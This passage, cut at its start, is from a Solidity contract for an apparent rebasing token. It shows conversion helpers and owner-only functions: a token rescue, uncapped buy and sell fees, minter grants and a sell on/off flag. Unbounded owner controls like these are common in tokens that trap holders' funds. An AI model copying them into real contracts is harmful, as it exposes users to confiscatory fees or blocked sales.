		return eggs.mul(eggssScalingFactor).div(internalDecimals);
	}

	function _fragmentToEggs(uint256 value) internal view returns (uint256) {
		return value.mul(internalDecimals).div(eggssScalingFactor);
	}

	// Rescue tokens
	function rescueTokens(address token, address to, uint256 amount) public onlyOwner returns (bool) {
		// transfer to
		SafeERC20.safeTransfer(IERC20(token), to, amount);
		return true;
	}

	function setBuyFee(uint256 _buyFee) public onlyOwner {
		buyFee = _buyFee;
	}

	function setSellFee(uint256 _sellFee) public onlyOwner {
		sellFee = _sellFee;
	}

	function setFeeWhiteList(address addr, bool enable) external onlyOwner {
		_feeWhiteList[addr] = enable;
	}

	function setMinter(address addr, bool enable) external onlyOwner {
		mintRole[addr] = enable;
	}

	function setSellFlag(bool _sellFlag) external onlyOwner {
		sellFlag = _sellFlag;
	}

	function setSwapFlag(bool _swapFlag) external onlyOwner {
		swapFlag = _swapFlag;
	}

	function updateDepositGame(uint256 amount) private {
		require(depositGame != IDepositGame(address(0)), "depositGame is not set");
		depositGame.updateMintAmount(amount);
	}

	function setRebaseTime(uint _rebaseTime) public onlyOwner {
		rebaseTime = _rebaseTime;
	}
}